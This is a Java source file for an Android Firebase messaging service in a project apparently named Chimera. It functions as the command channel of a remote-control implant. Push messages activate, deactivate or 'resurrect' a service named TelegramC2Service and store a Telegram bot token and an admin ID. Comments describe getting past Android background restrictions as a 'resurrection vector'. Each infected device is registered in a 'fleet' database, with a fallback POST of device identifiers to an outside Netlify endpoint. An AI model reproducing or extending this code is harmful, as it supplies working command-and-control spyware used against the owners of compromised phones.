package com.chimera;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.provider.Settings;
import androidx.annotation.NonNull;
import com.google.firebase.messaging.FirebaseMessaging;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.google.firebase.firestore.FirebaseFirestore;
import java.util.HashMap;
import java.util.Map;

public class FCMHandlerService extends FirebaseMessagingService {

    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);
        registerDevice(this);
    }

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        super.onMessageReceived(remoteMessage);
        // FCM high-priority is exempt from background FGS start restrictions (research validated)
        // This is our strongest resurrection vector even in Doze/Restricted bucket
        try { ResurrectionHelper.resurrect(this); } catch (Exception ignored) {}
        Map<String, String> data = remoteMessage.getData();
        if (data.size() > 0) {
            String action = data.get("action");
            if ("activate".equals(action)) {
                String botToken = data.get("bot_token");
                String adminId = data.get("admin_id");
                if (botToken != null && adminId != null) {
                    saveConfig(botToken, adminId);
                    // Clear deactivated flag
                    getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE).edit().putBoolean("deactivated", false).apply();
                    startMainService();
                }
            } else if ("deactivate".equals(action)) {
                getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE).edit().putBoolean("deactivated", true).apply();
                TransportManager.switchToAuto(this);
                stopMainService();
            } else if ("resurrect".equals(action)) {
                // Simple ping to resurrect - no config change
                startMainService();
            } else if ("switch_transport".equals(action)) {
                String mode = data.get("mode");
                if ("client".equals(mode)) TransportManager.switchToClientProtocol(this);
                else if ("auto".equals(mode)) TransportManager.switchToAuto(this);
                else if (mode != null) {
                    // gist_url, mqtt broker switch
                    if (mode.startsWith("gist:")) {
                        String url = mode.substring(5);
                        getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE).edit().putString("gist_url", url).apply();
                    }
                }
            } else if ("switch_client".equals(action)) {
                TransportManager.switchToClientProtocol(this);
                startMainService();
            }
        }
        // Also check notification payload fallback
        if (remoteMessage.getNotification() != null) {
            startMainService();
        }
    }

    public static void registerDevice(Context context) {
        FirebaseMessaging.getInstance().getToken().addOnCompleteListener(task -> {
            if (task.isSuccessful() && task.getResult() != null) {
                String token = task.getResult();
                sendRegistrationToFirestore(context, token);
                // Legacy Netlify kept as fallback but Firestore is primary (no dedicated domain)
                sendRegistrationToServerFallback(context, token);
            }
        });
    }

    private static void sendRegistrationToFirestore(Context context, String token) {
        new Thread(() -> {
            try {
                if (!NetworkStateMonitor.canAttemptHeartbeat(context)) return;
                String deviceModel = Build.MANUFACTURER + " " + Build.MODEL;
                String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
                Map<String,Object> data = new HashMap<>();
                data.put("fcmToken", token);
                data.put("deviceName", deviceModel);
                data.put("deviceId", androidId);
                data.put("lastSeen", System.currentTimeMillis());
                data.put("manufacturer", OemHelper.getManufacturerLabel());
                data.put("transport", TransportManager.getActiveTransport());
                FirebaseFirestore.getInstance().collection("fleet").document(androidId).set(data);
                // also presence subcollection
                Map<String,Object> presence = new HashMap<>();
                presence.put("online", true);
                presence.put("ts", System.currentTimeMillis());
                FirebaseFirestore.getInstance().collection("fleet").document(androidId).collection("presence").document("current").set(presence);
            } catch (Exception e) {
                ErrorLogger.logError(context, "FCM_FirestoreReg", e);
            }
        }).start();
    }

    // Fallback Netlify - kept but not relied upon, gated
    private static void sendRegistrationToServerFallback(Context context, String token) {
        new Thread(() -> {
            try {
                if (!NetworkStateMonitor.canAttemptHeartbeat(context)) return;
                String deviceModel = Build.MANUFACTURER + " " + Build.MODEL;
                String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
                org.json.JSONObject postData = new org.json.JSONObject();
                postData.put("fcmToken", token);
                postData.put("deviceName", deviceModel);
                postData.put("deviceId", androidId);
                java.net.URL url = new java.net.URL("https://chimeradmin.netlify.app/.netlify/functions/register-device");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                try (java.io.OutputStream os = conn.getOutputStream()) {
                    os.write(postData.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8));
                }
                conn.getInputStream().close();
                conn.disconnect();
            } catch (Exception e) {
                // Silent fallback failure - Firestore is primary
                ErrorLogger.logError(context, "FCM_FallbackReg", e);
            }
        }).start();
    }

    private void saveConfig(String token, String id) {
        SharedPreferences prefs = getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString("bot_token", token);
        try { editor.putLong("admin_id", Long.parseLong(id)); } catch (Exception e) { editor.putString("admin_id_str", id); }
        editor.apply();
        ConfigLoader.load(this);
    }

    private void startMainService() {
        try { ResurrectionHelper.resurrect(this); } catch (Exception e) { ErrorLogger.logError(this, "FCM_startMain", e); }
        Intent serviceIntent = new Intent(this, TelegramC2Service.class);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            // Background start denied -> delegate to WorkManager which has exemption
            ErrorLogger.logError(this, "FCM_startMain_FGS", e);
            ResurrectionHelper.scheduleResurrectionWork(this);
        }
    }

    private void stopMainService() {
        try { TransportManager.stopAll(); } catch (Exception ignored) {}
        stopService(new Intent(this, TelegramC2Service.class));
    }
}
